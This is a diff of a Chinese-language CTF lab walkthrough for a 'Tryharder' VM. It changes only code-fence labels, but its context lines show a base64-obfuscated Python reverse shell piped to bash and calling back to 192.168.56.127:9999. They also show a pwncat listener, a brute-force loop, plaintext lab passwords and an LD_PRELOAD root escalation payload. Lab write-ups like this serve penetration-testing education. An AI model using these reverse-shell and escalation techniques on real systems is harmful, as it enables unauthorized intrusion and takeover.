@@ -27,7 +27,7 @@ Hello Hacker! Try Harder!
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap --min-rate=2000 -A -p- 192.168.56.129
 Nmap scan report for bogon (192.168.56.129)
@@ -69,7 +69,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 尝试目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch -u http://192.168.56.129/74221/
 
@@ -164,7 +164,7 @@ Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
 
 先反弹 shell
 
-```shell
+```bash
 > echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTI3Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw== | base64 -d | bash
 ```
 
@@ -172,7 +172,7 @@ Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
 
 即可得到回连的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [15:31:31] Welcome to pwncat 🐈!
@@ -185,7 +185,7 @@ www-data
 
 尝试自动化分析提权路径
 
-```shell
+```bash
 (remote) www-data@Tryharder:/tmp$ ./linpeas.sh
 ......
 ╔══════════╣ Cleaned processes
@@ -222,7 +222,7 @@ xiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash
 
 很明显，有一个计划任务在定期执行 `/srv/backdoor.py`
 
-```shell
+```bash
 (remote) www-data@Tryharder:/tmp$ ls -lah /srv/backdoor.py
 -rwx------ 1 xiix xiix 1012 Mar 23 23:42 /srv/backdoor.py
 ```
@@ -274,7 +274,7 @@ print(decoded_str)
 
 同时，尝试探测这个 python 脚本在做什么
 
-```shell
+```bash
 (remote) www-data@Tryharder:/tmp$ ss -lntup
 Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port
 udp                     UNCONN                   0                        0                                                0.0.0.0:68                                            0.0.0.0:*
@@ -291,7 +291,7 @@ tcp                     LISTEN                   0                        128   
 
 尝试与这个 `8989` 端口进行通信
 
-```shell
+```bash
 (remote) www-data@Tryharder:/tmp$ nc 127.0.0.1 8989
 Enter password: Y0U_5M4SH3D_17_8UDDY
 Access granted!
@@ -301,7 +301,7 @@ xiix
 
 尝试反弹 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [17:18:03] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
@@ -317,7 +317,7 @@ xiix
 
 在用户目录下发现一个猜数游戏
 
-```shell
+```bash
 (remote) xiix@Tryharder:/home/xiix$ ls -laih
 total 44K
 148005 drwxr-xr-x 3 xiix xiix 4.0K Mar 25 01:32 .
@@ -338,7 +338,7 @@ total 44K
 
 直接开始爆破，成功拿到信息
 
-```shell
+```bash
 (remote) xiix@Tryharder:/home/xiix$ for i in $(seq 1000);do echo 32 | ./guess_game ;done
 ......
 ===== 终极运气挑战 / Ultimate Luck Challenge ====
@@ -354,7 +354,7 @@ Pass: superxiix
 
 并获取到 sudo 信息
 
-```shell
+```bash
 (remote) xiix@Tryharder:/home/xiix$ sudo -l
 [sudo] password for xiix:
 Matching Defaults entries for xiix on tryharder:
@@ -368,7 +368,7 @@ User xiix may run the following commands on tryharder:
 
 那么就简单了，使用 `env_keep+=LD_PRELOAD` 进行攻击
 
-```shell
+```bash
 (remote) xiix@Tryharder:/home/xiix$ echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCl9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKSkKdm9pZCBpbml0KCkKewogICAgcHV0cygiSGVsbG8gZHluYW1pYyBsaW5rYWdlIHdvcmxkISIpOwogICAgdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsKICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7Cn0K | base64 -d
 #include <stdio.h>
 #include <stdlib.h>
@@ -400,7 +400,7 @@ Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}
 
 `Y0U_5M4SH3D_17_8UDDY` 也是用户 `pentester` 的密码
 
-```shell
+```bash
 (remote) www-data@Tryharder:/tmp$ su pentester
 Password:
 pentester@Tryharder:/tmp$ whoami
@@ -409,7 +409,7 @@ pentester
 
 并且其 sudo 信息为
 
-```shell
+```bash
 pentester@Tryharder:/tmp$ sudo -l
 Matching Defaults entries for pentester on tryharder:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
